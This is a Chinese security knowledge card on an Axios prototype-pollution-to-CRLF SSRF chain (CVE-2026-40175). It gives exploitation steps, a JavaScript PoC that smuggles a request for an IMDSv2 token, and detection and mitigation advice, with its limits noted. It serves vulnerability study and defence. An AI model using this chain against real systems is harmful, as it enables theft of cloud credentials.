---
id: web-generic-ssrf-axios-mergeconfig-prototype-header-crlf
title: Axios mergeConfig 继承原型污染 headers：CRLF 请求拆分转 SSRF 读云元数据（CVE-2026-40175）
type: scenario
domain: web
path: web/generic/ssrf
technique: axios-mergeconfig-prototype-polluted-header-crlf-ssrf
aliases:
- CVE-2026-40175
- Axios SSRF
- Axios 原型污染
- mergeConfig 继承 headers
- Object.prototype.headers
- X-Smuggle
- rawSocketAdapter
- CRLF header 注入
- IMDSv2 token SSRF
tags:
- axios
- nodejs
- prototype-pollution
- ssrf
- crlf-injection
- request-smuggling
- cloud-metadata
- imds
- cve-2026-40175
cve:
- CVE-2026-40175
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: axios < 1.15.0
verification:
  verified_by: verifier-V40
  verified_at: '2026-11-05T06:34:48+08:00'
  notes: 已对照原文与11张图核对：图01-02 JSON字符串payload经JSON.parse保留__proto__自有键；图03-04 vulnerableMerge递归把 headers 写入 Object.prototype；图05-06 fresh.headers 继承X-Smuggle且includes CRLF为true；图07-08 options.headers继承后赋值taintedHeaders并delete全局污染；图09-10响应含两个HTTP响应及FAKE-IMDSv2-TOKEN-deadbeef1234；图11容器内直连IMDS同样返回该Token。CVE-2026-40175、axios<1.15.0与原文一致。核对注意：PoC在delete污染后把taintedHeaders显式传给axios，未直接演示mergeConfig自动继承，且默认Node adapter通常拒绝CR/LF、需rawSocketAdapter，卡内已注明后者但未点明前者，置信medium保留。PoC未在本机执行。frontmatter 无 sources/source_url。
---

## 一句话结论

当应用先被原型污染写入 `Object.prototype.headers`，且使用 Axios `< 1.15.0` 的 `mergeConfig` 合并请求配置时，污染出来的 `headers` 会被所有请求继承；若该 header 值包含 `\r\n`，并在能原样写出的传输路径（本文 PoC 使用自定义 `rawSocketAdapter`）上发出，HTTP 请求会被拆成两段，第二段可指向 `imds`/`localhost` 等内部目标，形成请求走私式 SSRF 并读取云元数据凭证。

## 原理

- **原型污染前提**：应用里存在递归 merge 且不检查自有属性，例如 `for (const key of Object.keys(source))` 后对 `__proto__` 继续递归，`target["__proto__"]` 返回 `Object.prototype`，于是 `source.__proto__.headers` 被写进全局 `Object.prototype.headers`。`JSON.parse()` 本身不会污染；污染发生在把解析结果交给不安全 merge 之后。
- **Axios 配置合并缺陷**：`mergeConfig(defaultConfig, userConfig)` 用 `for (const key in userConfig)` 遍历，包括原型链上的可枚举属性，且未用 `hasOwnProperty`/`Object.keys` 过滤；`Object.prototype.headers` 因此被当成“用户配置”合并进每个请求。
- **继承面大**：不只显式传 `headers` 的请求，任何 Axios 请求都会带上污染 header；攻击者不需要控制目标请求的 URL 或参数，只要污染成功即可。
- **CRLF 拆分**：HTTP/1.1 以 `\r\n\r\n` 分隔头部与正文。把 header 值构造成 `benign\r\n\r\nPUT /latest/api/token HTTP/1.1\r\nHost: imds\r\n...`，在“原样写出 header 字节”的传输实现中，第一段成为合法请求，后续字节被接收端解析为第二个请求，`Host` 指向内部服务（IMDS/localhost）。
- **SSRF 落点**：第二个请求发往云元数据服务（如 `imds` 或 `169.254.169.254`），返回临时凭证/Token；PoC 中返回 `FAKE-IMDSv2-TOKEN-deadbeef1234`，服务端响应体里同时出现两个 HTTP 响应，证明拆分成功。
- **关键边界**：本文 PoC 显式使用 `adapter: rawSocketAdapter`，绕过 Axios 默认 HTTP adapter 直接写 socket。默认 Node `http` 客户端通常会拒绝含 CR/LF 的 header 值；因此“默认 Axios 配置下能否直接走私”未被本文证明。该链还要求应用自身存在原型污染原语，Axios 只是把污染放大到请求配置。

## 触发条件

- 目标使用 axios `< 1.15.0`，并在请求路径上调用 `mergeConfig`（默认请求流程即会合并配置）。
- 应用存在可被攻击者触发的原型污染：不安全的递归 merge/`for...in` 合并、未过滤 `__proto__`/`constructor.prototype`，且输入可控。
- 污染写入的是 Axios 会消费的配置键（`headers`、`method`、`url`、`baseURL` 等）。
- 污染 header 值中的 `\r\n` 能到达传输层：需要自定义/raw adapter、允许原始 header 的代理，或中间件未拒绝 CR/LF；默认 Node adapter 通常会拒绝，本文未证明默认路径。
- 目标进程能访问内部服务/云元数据；接收端接受第二段请求行与 Host。

## 利用步骤

1. 找到应用的原型污染入口：可控 JSON/表单经 `lodash.merge` 一类不安全合并，或业务自写递归 merge；确认 `__proto__` 未被过滤。
2. 构造污染载荷，把 `headers` 设为包含完整第二请求的字符串：`X-Smuggle: benign\r\n\r\nPUT /latest/api/token HTTP/1.1\r\nHost: imds\r\n...`。
3. 触发合并，使 `Object.prototype.headers` 被写入；用新空对象验证 `({}).headers` 是否存在（污染成功）。
4. 触发目标的一个 Axios 请求；如果应用使用 raw/自定义 adapter 或存在允许 CRLF 的转发层，请求会被拆成两段，第二段发往内部目标。
5. 读取响应中的两个 HTTP 响应，第二个响应体即内部服务返回（如 IMDS Token）。
6. 用泄露的 Token 访问云 API；若目标使用 IMDSv2，先按第二段请求取 token 再带 `X-aws-ec2-metadata-token` 访问元数据。

## PoC

```javascript
// 1) 应用侧不安全 merge（演示用，等价于未过滤 __proto__ 的 lodash.merge）
function vulnerableMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (source[key] && typeof source[key] === 'object') {
      if (!target[key]) target[key] = {};
      vulnerableMerge(target[key], source[key]); // key='__proto__' 时 target[key] 是 Object.prototype
    } else {
      target[key] = source[key];
    }
  }
}

const SMUGGLED =
  'benign\r\n\r\n' +
  'PUT /latest/api/token HTTP/1.1\r\n' +
  'Host: imds\r\n' +
  'X-aws-ec2-metadata-token-ttl-seconds: 20000\r\n\r\n';

// 必须写成 JSON 字符串字面量：对象字面量里的 __proto__ 是语法级原型设置，
// 不是自有可枚举键，JSON.stringify 会把它丢掉；JSON.parse 才会保留为自有键。
const attackerJSON =
  '{"name":"victim","__proto__":{"headers":{"X-Smuggle":' +
  JSON.stringify(SMUGGLED) +
  '}}}';

vulnerableMerge({}, JSON.parse(attackerJSON)); // 污染 Object.prototype.headers

// 2) 任意 Axios 请求继承污染 headers；PoC 用自定义 raw adapter 原样写出 CRLF
const taintedHeaders = ({}).headers;
delete Object.prototype.headers;                // 清理全局污染，避免 Axios 内部逻辑崩溃

await axios.get(`http://${BACKEND.host}:${BACKEND.port}/public`, {
  headers: taintedHeaders,
  adapter: rawSocketAdapter,                    // 关键：默认 adapter 通常拒绝 CR/LF
});

// 3) 服务端返回两个响应：第一个是 /public 的正常响应，第二个是 imds 的 Token
```

```text
预期（原文实验）：
HTTP/1.1 200 OK（/public）
...
HTTP/1.1 200 OK（第二段）
...
FAKE-IMDSv2-TOKEN-deadbeef1234
```

## 变体与关联

- 变体（污染其他配置键）：污染 `baseURL`/`url` 让请求改道，或污染 `method`/`data` 改变请求语义；不依赖 CRLF 即可做有限 SSRF。
- 变体（header 注入目标）：除 IMDS 外可指向 `localhost` 管理面板、内网 Redis/Elasticsearch 等；第二段请求方法/路径完全由攻击者控制。
- 变体（传输路径）：真实环境中的反向代理、HTTP/1.0 后端、允许原始 header 的适配器可能保留 CRLF；默认 Node adapter 通常拒绝，需逐环境验证。
- 关联：[[web-generic-ssrf-cloud-metadata]]（SSRF 读云元数据的通用目标与凭证利用）、[[web-generic-ssrf-redis-inline-protocol-crlf]]（CRLF 构造协议请求的另一条链）、[[web-generic-crlf-crlf-injection-bypass]]（若存在则关联 CRLF 注入绕过）。
- 边界：`JSON.parse` 本身安全；必须有应用级污染原语。PoC 的 `rawSocketAdapter` 是自定义传输，不能直接外推为“默认 Axios 即可走私”。原文只证明到 mock IMDS 的假 Token，未在真实云环境验证。

## 检测与防御

- 修复：升级 axios ≥ 1.15.0；同时修复应用侧原型污染（递归 merge 只遍历自有属性、拒绝 `__proto__`/`constructor`/`prototype`，使用 `Object.create(null)` 或 `Object.freeze(Object.prototype)`）。
- 传输加固：Node 侧拒绝 header 名/值中的 CR/LF（`http.validateHeaderName`/`validateHeaderValue`）；不要把用户可控值直接写入 header；自定义 adapter 必须自行校验。
- 架构：云元数据使用 IMDSv2 并限制 hop limit；应用进程默认禁止访问元数据地址；内网服务双向认证，不能仅凭 Host 区分。
- 检测：请求中出现重复请求行/多个 Host、响应体包含两个 HTTP 状态行；`Object.prototype` 被写入 `headers`/`method`/`url` 的运行时告警；Axios 请求出现非预期 header（如 `X-Smuggle`）或 CR/LF；进程对 169.254.169.254/`imds` 的访问。
- 审计：搜索 `for (... in ...)` 的配置合并、`merge`/`defaultsDeep` 的原型链处理、`axios` 请求前是否对 `headers` 做自有属性校验。
